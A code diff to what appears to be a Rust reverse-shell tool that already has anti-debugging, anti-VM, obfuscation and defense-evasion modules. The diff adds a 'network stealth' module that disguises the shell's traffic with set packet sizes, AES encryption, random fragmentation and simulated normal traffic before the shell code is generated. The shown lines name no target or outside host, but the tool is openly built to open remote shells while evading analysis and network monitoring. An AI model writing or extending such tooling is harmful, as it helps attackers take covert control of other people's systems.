@@ -10,6 +10,7 @@ mod anti_vm;
 mod connection_methods;
 mod obfuscation;
 mod defense_evasion;
+mod network_stealth;
 
 use encryption::{generate_obfuscated_string, XorKey};
 use connection::{Connection, ConnectionConfig};
@@ -18,6 +19,7 @@ use anti_vm::AntiVM;
 use connection_methods::ConnectionMethod;
 use obfuscation::Obfuscation;
 use defense_evasion::DefenseEvasion;
+use network_stealth::{NetworkStealth, TrafficPattern, Protocol, Encryption as NetworkEncryption, Fragmentation};
 
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
@@ -63,6 +65,7 @@ fn main() -> anyhow::Result<()> {
     let anti_debug = AntiDebug::new();
     let anti_vm = AntiVM::new();
     let defense_evasion = DefenseEvasion::new();
+    let network_stealth = NetworkStealth::new();
 
     // Check for debugging
     if anti_debug.detect_debugger() {
@@ -107,6 +110,22 @@ fn main() -> anyhow::Result<()> {
         return Ok(());
     }
     
+    // Set up network stealth
+    let traffic_pattern = TrafficPattern {
+        packet_size: 1024,
+        inter_arrival_time: Duration::from_millis(100),
+        protocol: Protocol::Tcp,
+        encryption: NetworkEncryption::Aes,
+        fragmentation: Fragmentation::Random,
+    };
+    network_stealth.set_traffic_pattern(traffic_pattern);
+
+    // Simulate normal traffic
+    if !network_stealth.simulate_normal_traffic() {
+        println!("Failed to simulate normal traffic!");
+        return Ok(());
+    }
+
     // Generate the reverse shell code
     let shell_code = generate_shell_code(&args)?;
     
